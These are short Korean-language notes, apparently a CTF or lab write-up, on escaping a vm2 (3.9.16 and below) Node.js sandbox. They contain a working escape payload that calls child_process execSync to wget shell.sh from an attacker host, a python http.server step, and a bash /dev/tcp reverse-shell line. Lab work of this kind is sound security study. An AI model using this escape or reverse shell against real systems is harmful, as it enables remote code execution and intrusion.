- Node.js code를 온라인에서 실행하는 샌드 박스 프로그램이 있는 것을 확인
- 해당 웹 서버에는 제한 사항이 있음(사용 불가 기능)
  - fs
  - 자식 프로세스

- 3.9.16 이하 버전 vm2 취약점이 있는 것을 알 수 있었다.
- 순서
  - 에러 객체에 오버라이딩 함
  - 에러를 발생시켜 오버라이딩한 내용을 실행
  - access objects created outside the sandbox and execute arbitrary code

- 해당 코드를 사용하여 실행한다.
```
const {VM}=require("vm2");
const vm=new VM();

const code=`
const customInspectSymbol=Symbol.for('nodejs.util.inspect.custom');

obj={

[customInspectSymbol]: (depth, opt, inspect)=>{
inspect.constructor('return process')().mainModule.require('child_process').execSync('wget <내 ip>:80/shell.sh');
}, valueOf: undefined,
constructor: undefined,
}
WebAssembly.compileStreaming(obj).catch(()=>{});
`;
vm.run(code);
```
- execSync('')안에 실행할 코드를 넣는다.
- python3 -m http.server 80 실행 후 wget http://10.10.14.33:80/shell.sh 를 넣어 쉘을 다운로드 시킨다.
### shell.sh에 #!/bin/bash
### bash -i -p >& /dev/tcp/10.10.14.33/4444 0>&1 를 넣고 원격으로 실행 시킨다.
### reverse shell을 얻어야 하지만 연결이 되지 않아 나중에 해결 바람
